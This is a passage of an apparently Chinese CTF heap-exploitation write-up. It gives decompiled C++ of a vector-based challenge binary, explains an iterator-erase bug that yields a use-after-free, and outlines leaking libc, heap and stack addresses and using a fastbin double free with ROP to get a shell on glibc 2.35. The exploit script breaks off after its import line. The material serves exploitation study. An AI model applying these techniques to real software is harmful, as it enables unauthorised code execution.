  v7 <span class="token operator">=</span> __readfsqword<span class="token punctuation">(</span>0x28u<span class="token punctuation">)</span><span class="token punctuation">;</span>
  std<span class="token punctuation">:</span><span class="token punctuation">:</span>vector<span class="token operator">&lt;</span>char <span class="token operator">*</span><span class="token operator">></span><span class="token punctuation">:</span><span class="token punctuation">:</span>vector<span class="token punctuation">(</span>v5<span class="token punctuation">,</span> argv<span class="token punctuation">,</span> envp<span class="token punctuation">)</span><span class="token punctuation">;</span>
  std<span class="token punctuation">:</span><span class="token punctuation">:</span>vector<span class="token operator">&lt;</span><span class="token builtin">int</span><span class="token operator">></span><span class="token punctuation">:</span><span class="token punctuation">:</span>vector<span class="token punctuation">(</span>v6<span class="token punctuation">)</span><span class="token punctuation">;</span>
  setbuf<span class="token punctuation">(</span>stdin<span class="token punctuation">,</span> 0LL<span class="token punctuation">)</span><span class="token punctuation">;</span>
  setbuf<span class="token punctuation">(</span>stdout<span class="token punctuation">,</span> 0LL<span class="token punctuation">)</span><span class="token punctuation">;</span>
  v3 <span class="token operator">=</span> std<span class="token punctuation">:</span><span class="token punctuation">:</span>operator<span class="token operator">&lt;&lt;</span><span class="token operator">&lt;</span>std<span class="token punctuation">:</span><span class="token punctuation">:</span>char_traits<span class="token operator">&lt;</span>char<span class="token operator">>></span><span class="token punctuation">(</span><span class="token operator">&amp;</span>std<span class="token punctuation">:</span><span class="token punctuation">:</span>cout<span class="token punctuation">,</span> <span class="token string">"welcome!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  std<span class="token punctuation">:</span><span class="token punctuation">:</span>ostream<span class="token punctuation">:</span><span class="token punctuation">:</span>operator<span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>v3<span class="token punctuation">,</span> <span class="token operator">&amp;</span>std<span class="token punctuation">:</span><span class="token punctuation">:</span>endl<span class="token operator">&lt;</span>char<span class="token punctuation">,</span>std<span class="token punctuation">:</span><span class="token punctuation">:</span>char_traits<span class="token operator">&lt;</span>char<span class="token operator">>></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      menu<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      std<span class="token punctuation">:</span><span class="token punctuation">:</span>istream<span class="token punctuation">:</span><span class="token punctuation">:</span>operator<span class="token operator">>></span><span class="token punctuation">(</span><span class="token operator">&amp;</span>std<span class="token punctuation">:</span><span class="token punctuation">:</span>cin<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> v4 <span class="token operator">!=</span> <span class="token number">3</span> <span class="token punctuation">)</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
      clean<span class="token punctuation">(</span>v5<span class="token punctuation">,</span> v6<span class="token punctuation">)</span><span class="token punctuation">;</span>
      show<span class="token punctuation">(</span>v5<span class="token punctuation">,</span> v6<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> v4 <span class="token operator">></span> <span class="token number">3</span> <span class="token punctuation">)</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> v4 <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      alloc<span class="token punctuation">(</span>v5<span class="token punctuation">,</span> v6<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">else</span>
    <span class="token punctuation">&#123;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> v4 <span class="token operator">!=</span> <span class="token number">2</span> <span class="token punctuation">)</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
      clean<span class="token punctuation">(</span>v5<span class="token punctuation">,</span> v6<span class="token punctuation">)</span><span class="token punctuation">;</span>
      remove<span class="token punctuation">(</span>v5<span class="token punctuation">,</span> v6<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
  exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>


unsigned __int64 __fastcall clean<span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> __int64 a2<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token builtin">int</span> i<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>1Ch<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">-</span>34h<span class="token punctuation">]</span>
  __int64 v4<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>20h<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">-</span>30h<span class="token punctuation">]</span> BYREF
  __int64 v5<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>28h<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">-</span>28h<span class="token punctuation">]</span> BYREF
  __int64 v6<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>30h<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">-</span>20h<span class="token punctuation">]</span> BYREF
  unsigned __int64 v7<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>38h<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">-</span>18h<span class="token punctuation">]</span>

  v7 <span class="token operator">=</span> __readfsqword<span class="token punctuation">(</span>0x28u<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token punctuation">(</span>unsigned __int64<span class="token punctuation">)</span>std<span class="token punctuation">:</span><span class="token punctuation">:</span>vector<span class="token operator">&lt;</span><span class="token builtin">int</span><span class="token operator">></span><span class="token punctuation">:</span><span class="token punctuation">:</span>size<span class="token punctuation">(</span>a2<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">+</span><span class="token operator">+</span>i <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>std<span class="token punctuation">:</span><span class="token punctuation">:</span>vector<span class="token operator">&lt;</span><span class="token builtin">int</span><span class="token operator">></span><span class="token punctuation">:</span><span class="token punctuation">:</span>operator<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span>a2<span class="token punctuation">,</span> i<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      v4 <span class="token operator">=</span> std<span class="token punctuation">:</span><span class="token punctuation">:</span>vector<span class="token operator">&lt;</span><span class="token builtin">int</span><span class="token operator">></span><span class="token punctuation">:</span><span class="token punctuation">:</span>begin<span class="token punctuation">(</span>a2<span class="token punctuation">)</span><span class="token punctuation">;</span>
      v5 <span class="token operator">=</span> __gnu_cxx<span class="token punctuation">:</span><span class="token punctuation">:</span>__normal_iterator<span class="token operator">&lt;</span><span class="token builtin">int</span> <span class="token operator">*</span><span class="token punctuation">,</span>std<span class="token punctuation">:</span><span class="token punctuation">:</span>vector<span class="token operator">&lt;</span><span class="token builtin">int</span><span class="token operator">>></span><span class="token punctuation">:</span><span class="token punctuation">:</span>operator<span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v4<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>
      __gnu_cxx<span class="token punctuation">:</span><span class="token punctuation">:</span>__normal_iterator<span class="token operator">&lt;</span><span class="token builtin">int</span> const<span class="token operator">*</span><span class="token punctuation">,</span>std<span class="token punctuation">:</span><span class="token punctuation">:</span>vector<span class="token operator">&lt;</span><span class="token builtin">int</span><span class="token operator">>></span><span class="token punctuation">:</span><span class="token punctuation">:</span>__normal_iterator<span class="token operator">&lt;</span><span class="token builtin">int</span> <span class="token operator">*</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v6<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span>
      std<span class="token punctuation">:</span><span class="token punctuation">:</span>vector<span class="token operator">&lt;</span><span class="token builtin">int</span><span class="token operator">></span><span class="token punctuation">:</span><span class="token punctuation">:</span>erase<span class="token punctuation">(</span>a2<span class="token punctuation">,</span> v6<span class="token punctuation">)</span><span class="token punctuation">;</span>
      v4 <span class="token operator">=</span> std<span class="token punctuation">:</span><span class="token punctuation">:</span>vector<span class="token operator">&lt;</span>char <span class="token operator">*</span><span class="token operator">></span><span class="token punctuation">:</span><span class="token punctuation">:</span>begin<span class="token punctuation">(</span>a1<span class="token punctuation">)</span><span class="token punctuation">;</span>
      v5 <span class="token operator">=</span> __gnu_cxx<span class="token punctuation">:</span><span class="token punctuation">:</span>__normal_iterator<span class="token operator">&lt;</span>char <span class="token operator">**</span><span class="token punctuation">,</span>std<span class="token punctuation">:</span><span class="token punctuation">:</span>vector<span class="token operator">&lt;</span>char <span class="token operator">*</span><span class="token operator">>></span><span class="token punctuation">:</span><span class="token punctuation">:</span>operator<span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v4<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>
      __gnu_cxx<span class="token punctuation">:</span><span class="token punctuation">:</span>__normal_iterator<span class="token operator">&lt;</span>char <span class="token operator">*</span> const<span class="token operator">*</span><span class="token punctuation">,</span>std<span class="token punctuation">:</span><span class="token punctuation">:</span>vector<span class="token operator">&lt;</span>char <span class="token operator">*</span><span class="token operator">>></span><span class="token punctuation">:</span><span class="token punctuation">:</span>__normal_iterator<span class="token operator">&lt;</span>char <span class="token operator">**</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v6<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span>
      std<span class="token punctuation">:</span><span class="token punctuation">:</span>vector<span class="token operator">&lt;</span>char <span class="token operator">*</span><span class="token operator">></span><span class="token punctuation">:</span><span class="token punctuation">:</span>erase<span class="token punctuation">(</span>a1<span class="token punctuation">,</span> v6<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">return</span> v7 <span class="token operator">-</span> __readfsqword<span class="token punctuation">(</span>0x28u<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

unsigned __int64 __fastcall show<span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  unsigned __int64 v1<span class="token punctuation">;</span> <span class="token operator">//</span> rbx
  _QWORD <span class="token operator">*</span>v3<span class="token punctuation">;</span> <span class="token operator">//</span> rax
  <span class="token builtin">int</span> v5<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>14h<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">-</span>1Ch<span class="token punctuation">]</span> BYREF
  unsigned __int64 v6<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>18h<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">-</span>18h<span class="token punctuation">]</span>

  v6 <span class="token operator">=</span> __readfsqword<span class="token punctuation">(</span>0x28u<span class="token punctuation">)</span><span class="token punctuation">;</span>
  printf<span class="token punctuation">(</span><span class="token string">"idx> "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  std<span class="token punctuation">:</span><span class="token punctuation">:</span>istream<span class="token punctuation">:</span><span class="token punctuation">:</span>operator<span class="token operator">>></span><span class="token punctuation">(</span><span class="token operator">&amp;</span>std<span class="token punctuation">:</span><span class="token punctuation">:</span>cin<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> v5 <span class="token operator">>=</span> <span class="token number">0</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    v1 <span class="token operator">=</span> v5<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">&lt;</span> std<span class="token punctuation">:</span><span class="token punctuation">:</span>vector<span class="token operator">&lt;</span>char <span class="token operator">*</span><span class="token operator">></span><span class="token punctuation">:</span><span class="token punctuation">:</span>size<span class="token punctuation">(</span>a1<span class="token punctuation">)</span> <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      std<span class="token punctuation">:</span><span class="token punctuation">:</span>operator<span class="token operator">&lt;&lt;</span><span class="token operator">&lt;</span>std<span class="token punctuation">:</span><span class="token punctuation">:</span>char_traits<span class="token operator">&lt;</span>char<span class="token operator">>></span><span class="token punctuation">(</span><span class="token operator">&amp;</span>std<span class="token punctuation">:</span><span class="token punctuation">:</span>cout<span class="token punctuation">,</span> <span class="token string">"data: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      v3 <span class="token operator">=</span> <span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>std<span class="token punctuation">:</span><span class="token punctuation">:</span>vector<span class="token operator">&lt;</span>char <span class="token operator">*</span><span class="token operator">></span><span class="token punctuation">:</span><span class="token punctuation">:</span>operator<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> v5<span class="token punctuation">)</span><span class="token punctuation">;</span>
      std<span class="token punctuation">:</span><span class="token punctuation">:</span>operator<span class="token operator">&lt;&lt;</span><span class="token operator">&lt;</span>std<span class="token punctuation">:</span><span class="token punctuation">:</span>char_traits<span class="token operator">&lt;</span>char<span class="token operator">>></span><span class="token punctuation">(</span><span class="token operator">&amp;</span>std<span class="token punctuation">:</span><span class="token punctuation">:</span>cout<span class="token punctuation">,</span> <span class="token operator">*</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">return</span> v6 <span class="token operator">-</span> __readfsqword<span class="token punctuation">(</span>0x28u<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

unsigned __int64 __fastcall alloc<span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> __int64 a2<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  __int64 v2<span class="token punctuation">;</span> <span class="token operator">//</span> rax
  FILE <span class="token operator">*</span>v3<span class="token punctuation">;</span> <span class="token operator">//</span> r12
  <span class="token builtin">int</span> v4<span class="token punctuation">;</span> <span class="token operator">//</span> ebx
  __int64 v5<span class="token punctuation">;</span> <span class="token operator">//</span> rax
  char <span class="token operator">**</span>v6<span class="token punctuation">;</span> <span class="token operator">//</span> rax
  <span class="token builtin">int</span> n<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>1Ch<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">-</span>24h<span class="token punctuation">]</span> BYREF
  void <span class="token operator">*</span>v9<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>20h<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">-</span>20h<span class="token punctuation">]</span> BYREF
  unsigned __int64 v10<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>28h<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">-</span>18h<span class="token punctuation">]</span>

  v10 <span class="token operator">=</span> __readfsqword<span class="token punctuation">(</span>0x28u<span class="token punctuation">)</span><span class="token punctuation">;</span>
  std<span class="token punctuation">:</span><span class="token punctuation">:</span>operator<span class="token operator">&lt;&lt;</span><span class="token operator">&lt;</span>std<span class="token punctuation">:</span><span class="token punctuation">:</span>char_traits<span class="token operator">&lt;</span>char<span class="token operator">>></span><span class="token punctuation">(</span><span class="token operator">&amp;</span>std<span class="token punctuation">:</span><span class="token punctuation">:</span>cout<span class="token punctuation">,</span> <span class="token string">"size> "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  std<span class="token punctuation">:</span><span class="token punctuation">:</span>istream<span class="token punctuation">:</span><span class="token punctuation">:</span>operator<span class="token operator">>></span><span class="token punctuation">(</span><span class="token operator">&amp;</span>std<span class="token punctuation">:</span><span class="token punctuation">:</span>cin<span class="token punctuation">,</span> <span class="token operator">&amp;</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>
  v9 <span class="token operator">=</span> malloc<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>
  std<span class="token punctuation">:</span><span class="token punctuation">:</span>vector<span class="token operator">&lt;</span>char <span class="token operator">*</span><span class="token operator">></span><span class="token punctuation">:</span><span class="token punctuation">:</span>push_back<span class="token punctuation">(</span>a1<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v9<span class="token punctuation">)</span><span class="token punctuation">;</span>
  std<span class="token punctuation">:</span><span class="token punctuation">:</span>vector<span class="token operator">&lt;</span><span class="token builtin">int</span><span class="token operator">></span><span class="token punctuation">:</span><span class="token punctuation">:</span>push_back<span class="token punctuation">(</span>a2<span class="token punctuation">,</span> <span class="token operator">&amp;</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>
  std<span class="token punctuation">:</span><span class="token punctuation">:</span>operator<span class="token operator">&lt;&lt;</span><span class="token operator">&lt;</span>std<span class="token punctuation">:</span><span class="token punctuation">:</span>char_traits<span class="token operator">&lt;</span>char<span class="token operator">>></span><span class="token punctuation">(</span><span class="token operator">&amp;</span>std<span class="token punctuation">:</span><span class="token punctuation">:</span>cout<span class="token punctuation">,</span> <span class="token string">"content> "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v2 <span class="token operator">=</span> std<span class="token punctuation">:</span><span class="token punctuation">:</span>numeric_limits<span class="token operator">&lt;</span><span class="token builtin">long</span><span class="token operator">></span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token builtin">max</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  std<span class="token punctuation">:</span><span class="token punctuation">:</span>istream<span class="token punctuation">:</span><span class="token punctuation">:</span>ignore<span class="token punctuation">(</span><span class="token punctuation">(</span>std<span class="token punctuation">:</span><span class="token punctuation">:</span>istream <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>std<span class="token punctuation">:</span><span class="token punctuation">:</span>cin<span class="token punctuation">,</span> v2<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v3 <span class="token operator">=</span> stdin<span class="token punctuation">;</span>
  v4 <span class="token operator">=</span> n<span class="token punctuation">;</span>
  v5 <span class="token operator">=</span> std<span class="token punctuation">:</span><span class="token punctuation">:</span>vector<span class="token operator">&lt;</span>char <span class="token operator">*</span><span class="token operator">></span><span class="token punctuation">:</span><span class="token punctuation">:</span>size<span class="token punctuation">(</span>a1<span class="token punctuation">)</span><span class="token punctuation">;</span>
  v6 <span class="token operator">=</span> <span class="token punctuation">(</span>char <span class="token operator">**</span><span class="token punctuation">)</span>std<span class="token punctuation">:</span><span class="token punctuation">:</span>vector<span class="token operator">&lt;</span>char <span class="token operator">*</span><span class="token operator">></span><span class="token punctuation">:</span><span class="token punctuation">:</span>operator<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> v5 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  fgets<span class="token punctuation">(</span><span class="token operator">*</span>v6<span class="token punctuation">,</span> v4<span class="token punctuation">,</span> v3<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> v10 <span class="token operator">-</span> __readfsqword<span class="token punctuation">(</span>0x28u<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

unsigned __int64 __fastcall remove<span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> __int64 a2<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  unsigned __int64 v2<span class="token punctuation">;</span> <span class="token operator">//</span> rbx
  void <span class="token operator">**</span>v4<span class="token punctuation">;</span> <span class="token operator">//</span> rax
  __int64 v5<span class="token punctuation">;</span> <span class="token operator">//</span> rax
  <span class="token builtin">int</span> v7<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>14h<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">-</span>1Ch<span class="token punctuation">]</span> BYREF
  unsigned __int64 v8<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>18h<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">-</span>18h<span class="token punctuation">]</span>

  v8 <span class="token operator">=</span> __readfsqword<span class="token punctuation">(</span>0x28u<span class="token punctuation">)</span><span class="token punctuation">;</span>
  printf<span class="token punctuation">(</span><span class="token string">"idx> "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  std<span class="token punctuation">:</span><span class="token punctuation">:</span>istream<span class="token punctuation">:</span><span class="token punctuation">:</span>operator<span class="token operator">>></span><span class="token punctuation">(</span><span class="token operator">&amp;</span>std<span class="token punctuation">:</span><span class="token punctuation">:</span>cin<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v7<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> v7 <span class="token operator">>=</span> <span class="token number">0</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    v2 <span class="token operator">=</span> v7<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> v2 <span class="token operator">&lt;</span> std<span class="token punctuation">:</span><span class="token punctuation">:</span>vector<span class="token operator">&lt;</span>char <span class="token operator">*</span><span class="token operator">></span><span class="token punctuation">:</span><span class="token punctuation">:</span>size<span class="token punctuation">(</span>a1<span class="token punctuation">)</span> <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      v4 <span class="token operator">=</span> <span class="token punctuation">(</span>void <span class="token operator">**</span><span class="token punctuation">)</span>std<span class="token punctuation">:</span><span class="token punctuation">:</span>vector<span class="token operator">&lt;</span>char <span class="token operator">*</span><span class="token operator">></span><span class="token punctuation">:</span><span class="token punctuation">:</span>operator<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> v7<span class="token punctuation">)</span><span class="token punctuation">;</span>
      free<span class="token punctuation">(</span><span class="token operator">*</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>std<span class="token punctuation">:</span><span class="token punctuation">:</span>vector<span class="token operator">&lt;</span><span class="token builtin">int</span><span class="token operator">></span><span class="token punctuation">:</span><span class="token punctuation">:</span>operator<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span>a2<span class="token punctuation">,</span> v7<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
      v5 <span class="token operator">=</span> std<span class="token punctuation">:</span><span class="token punctuation">:</span>operator<span class="token operator">&lt;&lt;</span><span class="token operator">&lt;</span>std<span class="token punctuation">:</span><span class="token punctuation">:</span>char_traits<span class="token operator">&lt;</span>char<span class="token operator">>></span><span class="token punctuation">(</span><span class="token operator">&amp;</span>std<span class="token punctuation">:</span><span class="token punctuation">:</span>cout<span class="token punctuation">,</span> <span class="token string">"memory deleted"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      std<span class="token punctuation">:</span><span class="token punctuation">:</span>ostream<span class="token punctuation">:</span><span class="token punctuation">:</span>operator<span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>v5<span class="token punctuation">,</span> <span class="token operator">&amp;</span>std<span class="token punctuation">:</span><span class="token punctuation">:</span>endl<span class="token operator">&lt;</span>char<span class="token punctuation">,</span>std<span class="token punctuation">:</span><span class="token punctuation">:</span>char_traits<span class="token operator">&lt;</span>char<span class="token operator">>></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">return</span> v8 <span class="token operator">-</span> __readfsqword<span class="token punctuation">(</span>0x28u<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>第一次做stl迭代器安全相关的题</p>
<p>漏洞出在clean函数这边，这里的逻辑其实是 在循环chunklist.earse(chunklist.being() + i) sizelist.earse(list.being() + i) ，如果存在连续的size &#x3D;&#x3D; -1的堆块，第一次earse的时候 容器的大小发生了变化，所以earse后的i就不是 earse前的 i了。是 i + 1，然后alloc的时候，输入size  -1是能正常的push_back到sizelist里面的，所以可以通过这个漏洞去构造出uaf</p>
<pre class="line-numbers language-none"><code class="language-none">unsigned __int64 __fastcall clean(__int64 a1, __int64 a2)
&#123;
  int i; &#x2F;&#x2F; [rsp+1Ch] [rbp-34h]
  __int64 v4; &#x2F;&#x2F; [rsp+20h] [rbp-30h] BYREF
  __int64 v5; &#x2F;&#x2F; [rsp+28h] [rbp-28h] BYREF
  __int64 v6; &#x2F;&#x2F; [rsp+30h] [rbp-20h] BYREF
  unsigned __int64 v7; &#x2F;&#x2F; [rsp+38h] [rbp-18h]

  v7 &#x3D; __readfsqword(0x28u);
  for ( i &#x3D; 0; i &lt; (unsigned __int64)std::vector&lt;int&gt;::size(a2); ++i )
  &#123;
    if ( *(_DWORD *)std::vector&lt;int&gt;::operator[](a2, i) &#x3D;&#x3D; -1 )
    &#123;
      v4 &#x3D; std::vector&lt;int&gt;::begin(a2);
      v5 &#x3D; __gnu_cxx::__normal_iterator&lt;int *,std::vector&lt;int&gt;&gt;::operator+(&amp;v4, i);
      __gnu_cxx::__normal_iterator&lt;int const*,std::vector&lt;int&gt;&gt;::__normal_iterator&lt;int *&gt;(&amp;v6, &amp;v5);
      std::vector&lt;int&gt;::erase(a2, v6);
      v4 &#x3D; std::vector&lt;char *&gt;::begin(a1);
      v5 &#x3D; __gnu_cxx::__normal_iterator&lt;char **,std::vector&lt;char *&gt;&gt;::operator+(&amp;v4, i);
      __gnu_cxx::__normal_iterator&lt;char * const*,std::vector&lt;char *&gt;&gt;::__normal_iterator&lt;char **&gt;(&amp;v6, &amp;v5);
      std::vector&lt;char *&gt;::erase(a1, v6);
    &#125;
  &#125;
  return v7 - __readfsqword(0x28u);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>首先是glibc 2.35 构造任意地址写的原语需要泄露堆地址去绕开safe link, 泄露堆地址和 libc的地址，通过unsortedbin泄露libc的地址，可以直接申请一个很大的chunk然后free掉，这样就直接进unsortedbin了，不用填满tcache.</p>
<p>因为cout是读到换行就不读了，所以不能通过fastbin double free直接去泄露environ的值，但？直接写vector成员指针的值也可以？覆盖vector[0] 为 environ的地址然后show就能泄露栈地址了，泄露栈地址后再fastbin double free一次写返回地址然后打rop去getshell</p>
<p>exp</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">from pwn import <span class="token operator">*</span>
